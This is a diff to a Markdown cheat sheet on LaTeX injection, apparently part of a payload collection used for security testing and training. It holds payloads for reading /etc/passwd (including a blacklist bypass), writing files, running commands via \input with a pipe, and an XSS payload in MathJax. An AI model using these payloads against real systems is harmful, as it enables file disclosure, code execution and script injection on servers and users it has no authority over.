@@ -1,17 +1,23 @@
-# LaTex Injection
+# LaTeX Injection
+
+> LaTeX Injection is a type of injection attack where malicious content is injected into LaTeX documents. LaTeX is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. Due to its powerful scripting capabilities, LaTeX can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place. 
+
 
 ## Summary
 
-* [Read File](#read-file)
-* [Write File](#write-file)
+* [File Manipulation](#file-manipulation)
+    * [Read File](#read-file)
+    * [Write File](#write-file)
 * [Command Execution](#command-execution)
 * [Cross Site Scripting](#cross-site-scripting)
 * [References](#references)
 
 
-## Read File
+## File Manipulation
 
-You might need to adjust injection with wrappers as `\[` or `$`.
+### Read File
+
+Attackers can read the content of sensitive files on the server.
 
 Read file and interpret the LaTeX code in it:
 
@@ -70,7 +76,7 @@ To bypass a blacklist try to replace one character with it's unicode hex value.
 \lstin^^70utlisting{/etc/passwd}
 ```
 
-## Write File
+### Write File
 
 Write single lined file:
 
@@ -82,6 +88,7 @@ Write single lined file:
 \write\outfile{I like trains}
 \closeout\outfile
 ```
+
 
 ## Command Execution
 
@@ -104,6 +111,7 @@ If you get any LaTex error, consider using base64 to get the result without bad 
 \input{|"/bin/hostname"}
 ```
 
+
 ## Cross Site Scripting
 
 From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 
@@ -118,6 +126,12 @@ in [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.htm
 ```tex
 \unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
 ```
+
+
+## Labs
+
+* [Root Me - LaTeX - Input](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
+* [Root Me - LaTeX - Command execution](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)
 
 
 ## References
